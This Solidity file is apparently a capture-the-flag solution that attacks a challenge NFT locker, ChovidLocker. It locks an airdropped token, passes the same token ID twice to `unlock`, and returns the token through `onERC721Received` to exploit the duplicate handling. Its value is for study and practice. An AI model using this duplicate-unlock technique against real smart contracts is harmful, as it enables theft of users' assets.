// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import { SafeCast } from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import { Setup } from "../src/Setup.sol";
import { ChovidLocker } from "../src/ChovidLocker.sol";
import { ChovidNFT } from "../src/ChovidNFT.sol";

contract Exploit {
    using SafeCast for uint256;

    Setup public setup;
    ChovidLocker public locker;
    ChovidNFT public nft;
    uint256 public tokenId;

    constructor(address _setup){
        setup = Setup(_setup);
        locker = setup.chovidLocker();
        nft = setup.chovidNFT();
    }

    // immediately after `Setup` and `Exploit` contract is deployed
    // call this function to ensure the minted token is locked at epoch 0
    function prepareExploit() public {
        tokenId = setup.airdropNFT();
        nft.approve(address(locker), tokenId);
        ChovidLocker.LockInput[] memory inputs = new ChovidLocker.LockInput[](1);
        inputs[0] = ChovidLocker.LockInput({
            recipient: address(this),
            tokenId: tokenId
        });
        locker.lock(inputs);
    }

    // then wait for 44*3 seconds and then call `extendEpoch` to make changes
    // to state variables and create a block which then the locker epoch will be  
    // updated at the multiple to 3 epochs old such that we will be able to unlock. 
    // this only need to be called in local environment
    function extendEpoch() public {
        uint256 token = setup.airdropNFT();   
    }

    // then call this function to exploit the locker
    function exploit() public {
        uint256[] memory toUnlock = new uint256[](2);
        toUnlock[0] = tokenId;
        toUnlock[1] = tokenId;
        locker.unlock(toUnlock);
    }

    function onERC721Received(
        address,
        address _from,
        uint256 _tokenId,
        bytes calldata
    ) external returns (bytes4) {
        nft.transferFrom(address(this), _from, _tokenId);
        return this.onERC721Received.selector;
    }   
}